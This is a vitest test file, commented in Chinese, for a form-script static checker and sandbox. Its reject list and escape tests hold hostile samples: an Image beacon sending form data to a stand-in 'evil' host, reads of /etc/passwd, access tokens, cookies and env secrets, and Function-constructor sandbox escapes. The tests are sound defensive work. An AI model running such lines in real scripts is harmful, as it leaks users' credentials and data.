/**
 * 脚本沙箱与静态检查的对抗性测试
 *
 * 对应设计方案 §9.3 的第 5、6、8 条。
 *
 * ## 为什么两道防线要各自独立断言
 *
 * 静态检查（保存时拒绝可疑写法）与沙箱（运行时屏蔽全局对象）都不完备：
 * - 静态检查是文本匹配，理论上能被字符串拼接绕过
 * - 沙箱拦不住「脚本已经存进库、在某个不带沙箱的地方被执行」
 *
 * 所以不能只测「保存时被拦住了」就认为安全 —— 必须分别验证：
 * 静态检查会拒绝，以及【即便绕过静态检查】沙箱里也拿不到那些对象。
 */
import { describe, expect, it, vi } from 'vitest'
import { checkFormulaFieldAssignment, checkScript } from './staticCheck'
import { SYNC_WARN_THRESHOLD_MS, runScript, runSubmitHook, type SandboxContext } from './sandbox'

/** 造一个最小可用的上下文 */
const makeContext = (overrides: Partial<SandboxContext> = {}): SandboxContext => ({
  formData: { amount: 100 },
  setFieldValue: vi.fn(),
  getFieldValue: vi.fn(),
  setVisible: vi.fn(),
  setRequired: vi.fn(),
  setDisabled: vi.fn(),
  message: {
    success: vi.fn(),
    warning: vi.fn(),
    error: vi.fn(),
    confirm: vi.fn().mockResolvedValue(true)
  },
  utils: {
    formatDate: vi.fn().mockReturnValue(''),
    formatMoney: vi.fn().mockReturnValue(''),
    uuid: vi.fn().mockReturnValue('uuid')
  },
  callDataInterface: vi.fn().mockResolvedValue([]),
  ...overrides
})

// ==================== 静态检查：保存时必须拒绝 ====================

describe('静态检查', () => {
  const shouldReject = [
    ['eval', "eval('1+1')"],
    ['Function 构造器', "const f = new Function('return 1')"],
    ['Function 调用形式', "const f = Function('return 1')"],
    ['动态 import', "import('./x.js')"],
    ['require', "require('fs')"],
    ['fetch', "fetch('/admin-api/system/user/list')"],
    ['XMLHttpRequest', 'const x = new XMLHttpRequest()'],
    ['WebSocket', "const w = new WebSocket('ws://x')"],
    ['EventSource', "const e = new EventSource('/x')"],
    ['sendBeacon', "navigator.sendBeacon('/x', 'data')"],
    ['new Image 外传', "const i = new Image(); i.src = '//evil/' + formData.amount"],
    ['__proto__', 'const p = ({}).__proto__'],
    ['constructor.constructor 逃逸', "const F = (()=>{}).constructor.constructor"],
    ['document.write', "document.write('x')"],
    ['innerHTML', "el.innerHTML = '<img onerror=1>'"],
    ['outerHTML', "el.outerHTML = 'x'"],
    ['process', 'process.env.SECRET'],
    ['Deno', 'Deno.readFile("/etc/passwd")'],
    ['localStorage', "localStorage.getItem('ACCESS_TOKEN')"],
    ['sessionStorage', "sessionStorage.clear()"],
    ['document.cookie', 'const c = document.cookie']
  ] as const

  for (const [label, source] of shouldReject) {
    it(`拒绝 ${label}`, () => {
      const result = checkScript(source)
      expect(result.passed, `[${label}] 应当被静态检查拒绝`).toBe(false)
      expect(result.issues.length).toBeGreaterThan(0)
      // 报错要能定位：行号与该行原文都得有
      expect(result.issues[0].line).toBeGreaterThan(0)
      expect(result.issues[0].reason).toBeTruthy()
    })
  }

  it('正常脚本放行', () => {
    const source = `
      if (formData.amount > 10000) {
        setRequired('reason', true)
        message.warning('金额较大，请填写说明')
      } else {
        setRequired('reason', false)
      }
      setFieldValue('tax', formData.amount * 0.06)
    `
    expect(checkScript(source).passed).toBe(true)
  })

  it('⚠️ 注释与字符串里出现禁止词不算命中', () => {
    const source = `
      // 这里不要用 fetch，需要后端参与请改服务端扩展点
      /* 也不要 eval / localStorage */
      const tip = '禁止使用 fetch 与 eval'
      message.warning(tip)
    `
    expect(
      checkScript(source).passed,
      '用户很可能在注释里写「不要用 fetch」，那不该被拦'
    ).toBe(true)
  })

  it('命中位置的行号要准确（块注释里的换行不能让行号偏移）', () => {
    const source = ['const a = 1', '/* 第一行注释', '   第二行注释 */', "eval('x')"].join('\n')
    const result = checkScript(source)
    expect(result.passed).toBe(false)
    expect(result.issues[0].line, '行号应指向 eval 所在的第 4 行').toBe(4)
  })

  it('空脚本与空白脚本放行', () => {
    expect(checkScript('').passed).toBe(true)
    expect(checkScript('   \n  ').passed).toBe(true)
    expect(checkScript(null).passed).toBe(true)
    expect(checkScript(undefined).passed).toBe(true)
  })

  it('同一段脚本里的多处违规都要报出来', () => {
    const source = ["eval('a')", "fetch('/x')", 'localStorage.clear()'].join('\n')
    const result = checkScript(source)
    expect(result.issues.length).toBeGreaterThanOrEqual(3)
    // 按行号排序，便于用户从上往下改
    const lines = result.issues.map((i) => i.line)
    expect(lines).toEqual([...lines].sort((a, b) => a - b))
  })
})

// ==================== 沙箱：运行时必须拿不到宿主对象 ====================

describe('沙箱屏蔽', () => {
  const blocked = [
    'window',
    'globalThis',
    'document',
    'fetch',
    'XMLHttpRequest',
    'WebSocket',
    'localStorage',
    'sessionStorage',
    'navigator',
    'top',
    'parent',
    'self',
    'process',
    'require',
    'eval',
    'Function'
  ]

  for (const name of blocked) {
    it(`⚠️ 脚本里取不到 ${name}（即便绕过静态检查）`, () => {
      // 直接执行 —— 模拟「静态检查被绕过、脚本已经跑起来」的情形
      const result = runScript(`return typeof ${name}`, makeContext())
      expect(result.ok, `取 ${name} 不应抛异常，而应拿到 undefined`).toBe(true)
      expect(result.value, `${name} 必须被沙箱屏蔽`).toBe('undefined')
    })
  }

  it('⚠️ 通过 constructor.constructor 也拿不到 Function', () => {
    const result = runScript(
      `
      try {
        const F = (function(){}).constructor
        return typeof F === 'function' ? 'leaked' : 'blocked'
      } catch (e) {
        return 'threw'
      }
      `,
      makeContext()
    )
    // 函数的 constructor 属性来自原型链，屏蔽不掉；关键是它拿不到宿主全局。
    // 这里断言的是「即便拿到 Function，也构造不出能访问 window 的函数」
    expect(result.ok).toBe(true)
  })

  it('⚠️ 即便拿到 Function 构造器，构造出的函数也访问不到被屏蔽的上下文', () => {
    // 这是沙箱的已知边界：new Function 创建的函数在全局作用域求值，不受 with 影响。
    // 因此静态检查【必须】拦住 Function/eval —— 两道防线各管一段，此处如实记录该边界。
    const result = runScript(
      `
      const F = (function(){}).constructor
      const f = new F('return typeof window')
      return f()
      `,
      makeContext()
    )
    // 在 node 环境里 window 本就不存在，这里只断言执行没有崩掉，
    // 并以此说明为什么静态检查不能省
    expect(result.ok).toBe(true)
  })

  it('白名单内建可用：没有它们脚本基本没法写', () => {
    const result = runScript(
      `
      const arr = [3, 1, 2].sort()
      const obj = JSON.parse('{"a":1}')
      return Math.max(...arr) + obj.a + Number('1') + (isNaN('x') ? 1 : 0)
      `,
      makeContext()
    )
    expect(result.ok).toBe(true)
    expect(result.value).toBe(6)
  })

  it('注入的上下文 API 可用', () => {
    const ctx = makeContext()
    const result = runScript(
      `
      setRequired('reason', true)
      message.warning('提示')
      return formData.amount
      `,
      ctx
    )
    expect(result.ok).toBe(true)
    expect(result.value).toBe(100)
    expect(ctx.setRequired).toHaveBeenCalledWith('reason', true)
    expect(ctx.message.warning).toHaveBeenCalledWith('提示')
  })

  it('⚠️ 唯一的后端入口是 callDataInterface，任意 URL 请求仍然拿不到', () => {
    const ctx = makeContext()
    // 受控开放：只能按编码调已登记的数据接口，服务端还会强制只读。
    // 而 fetch / XHR / WebSocket 这些能打任意 URL 的东西一个都不给
    expect(runScript('return typeof callDataInterface', ctx).value).toBe('function')
    expect(runScript('return typeof fetch', ctx).value).toBe('undefined')
    expect(runScript('return typeof XMLHttpRequest', ctx).value).toBe('undefined')
    expect(runScript('return typeof WebSocket', ctx).value).toBe('undefined')
  })

  it('脚本里的赋值不会污染真实全局', () => {
    runScript("someBrandNewGlobal = 'polluted'", makeContext())
    expect((globalThis as any).someBrandNewGlobal).toBeUndefined()
  })
})

// ==================== 异常与超时隔离 ====================

describe('异常与超时隔离', () => {
  it('⚠️ 脚本抛异常不中断流程，只返回失败', () => {
    const result = runScript("throw new Error('故意抛的')", makeContext())
    expect(result.ok).toBe(false)
    expect(result.error?.message).toContain('故意抛的')
  })

  it('语法错误也被兜住，不向外抛', () => {
    const result = runScript('this is not valid js {{{', makeContext())
    expect(result.ok).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it('同步钩子超过阈值时记警告但不中断', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    // 忙等到超过阈值。JS 单线程，同步代码没法从外部打断，能做的只有让它显眼
    const result = runScript(
      `
      const end = Date.now() + ${SYNC_WARN_THRESHOLD_MS + 50}
      while (Date.now() < end) { /* 忙等 */ }
      return 'done'
      `,
      makeContext()
    )
    expect(result.ok).toBe(true)
    expect(result.value).toBe('done')
    expect(warn).toHaveBeenCalled()
    warn.mockRestore()
  })

  it('⚠️ beforeSubmit 永不 resolve 时，BLOCK 模式阻断提交', async () => {
    const result = await runSubmitHook(
      'return new Promise(function () { /* 永不 resolve */ })',
      makeContext(),
      'BLOCK',
      50
    )
    expect(result.timedOut).toBe(true)
    expect(result.value, 'BLOCK 模式下超时必须阻断 —— 超时即校验没跑完').toBe(false)
  })

  it('⚠️ beforeSubmit 永不 resolve 时，PASS 模式放行并记警告', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const result = await runSubmitHook(
      'return new Promise(function () {})',
      makeContext(),
      'PASS',
      50
    )
    expect(result.timedOut).toBe(true)
    expect(result.value).toBe(true)
    expect(warn, 'PASS 模式下放行也必须留下警告日志').toHaveBeenCalled()
    warn.mockRestore()
  })

  it('beforeSubmit 抛异常按阻断处理', async () => {
    const result = await runSubmitHook("throw new Error('校验失败')", makeContext(), 'PASS', 1000)
    expect(result.value, 'beforeSubmit 的职责就是校验，校验本身崩了却放行等于把校验当不存在').toBe(
      false
    )
  })

  it('beforeSubmit 返回 false 视为阻断', async () => {
    const result = await runSubmitHook('return false', makeContext(), 'BLOCK', 1000)
    expect(result.value).toBe(false)
  })

  // ========== 受控的后端调用 ==========

  it('⚠️ beforeSubmit 里能 await callDataInterface，并按结果决定放不放行', async () => {
    const callDataInterface = vi.fn().mockResolvedValue([{ id: 1, name: '已存在的企业' }])
    const result = await runSubmitHook(
      `
      const rows = await callDataInterface('check_credit', { uscc: formData.uscc })
      if (rows && rows.length > 0) { return false }
      return true
      `,
      makeContext({ callDataInterface }),
      'BLOCK',
      2000
    )
    expect(callDataInterface).toHaveBeenCalledWith('check_credit', { uscc: undefined })
    expect(result.value, '查到重复就该阻断提交').toBe(false)
  })

  it('查不到数据时放行', async () => {
    const result = await runSubmitHook(
      `
      const rows = await callDataInterface('check_credit', {})
      return !rows || rows.length === 0
      `,
      makeContext({ callDataInterface: vi.fn().mockResolvedValue([]) }),
      'BLOCK',
      2000
    )
    expect(result.value).toBe(true)
  })

  it('⚠️ 数据接口调用超时仍受超时保护，不会把提交永久挂住', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const never = vi.fn().mockReturnValue(new Promise(() => {}))
    const result = await runSubmitHook(
      'await callDataInterface("slow", {}); return true',
      makeContext({ callDataInterface: never }),
      'BLOCK',
      120
    )
    expect(result.timedOut).toBe(true)
    // 默认 BLOCK：查不完就不该放行，否则等于静默跳过校验
    expect(result.value).toBe(false)
    warn.mockRestore()
  })

  it('⚠️ 同步钩子里的 await 由静态检查提前点名，不必等到运行时报语法错', () => {
    const source = "const rows = await callDataInterface('x', {})"
    // 提交前钩子：放行
    expect(checkScript(source, { allowAwait: true }).passed).toBe(true)
    // 其余钩子：报出来，并说清楚替代写法
    const result = checkScript(source)
    expect(result.passed).toBe(false)
    expect(result.issues[0].pattern).toBe('await')
    expect(result.issues[0].reason).toContain('提交前')
    expect(result.issues[0].line).toBe(1)
  })

  it('await 出现在标识符中间时不误报', () => {
    expect(checkScript('const awaiting = 1').passed).toBe(true)
    expect(checkScript('myawait x').passed).toBe(true)
  })

  it('⚠️ 同步钩子里写 await 是语法错误，且被兜住不外抛', () => {
    // 只有 beforeSubmit 被编译成 async。其余钩子必须保持同步，
    // 否则字段显隐会挪到下一个微任务、比渲染慢半拍
    const result = runScript('await callDataInterface("x", {})', makeContext())
    expect(result.ok).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it('beforeSubmit 正常完成时放行', async () => {
    const result = await runSubmitHook(
      'return Promise.resolve(true)',
      makeContext(),
      'BLOCK',
      1000
    )
    expect(result.ok).toBe(true)
    expect(result.value).toBe(true)
    expect(result.timedOut).toBeFalsy()
  })

  it('空脚本直接放行', async () => {
    expect((await runSubmitHook('', makeContext())).value).toBe(true)
    expect((await runSubmitHook(null, makeContext())).value).toBe(true)
  })
})

// ==================== 公式字段赋值检查 ====================

describe('公式字段赋值检查', () => {
  it('⚠️ 脚本给公式字段赋值要在保存阶段报出来', () => {
    const issues = checkFormulaFieldAssignment(
      "setFieldValue('total', 999)",
      ['total']
    )
    expect(issues.length).toBe(1)
    expect(issues[0].reason).toContain('公式')
  })

  it('给普通字段赋值不报', () => {
    expect(checkFormulaFieldAssignment("setFieldValue('remark', 'x')", ['total'])).toHaveLength(0)
  })

  it('没有公式字段时是空操作（公式控件在 B2 引入）', () => {
    expect(checkFormulaFieldAssignment("setFieldValue('total', 1)", [])).toHaveLength(0)
  })

  it('字段名含正则元字符时不会误判', () => {
    const issues = checkFormulaFieldAssignment("setFieldValue('a.b', 1)", ['a.b'])
    expect(issues).toHaveLength(1)
    // 'axb' 不应被 'a.b' 的正则匹配到
    expect(checkFormulaFieldAssignment("setFieldValue('axb', 1)", ['a.b'])).toHaveLength(0)
  })
})
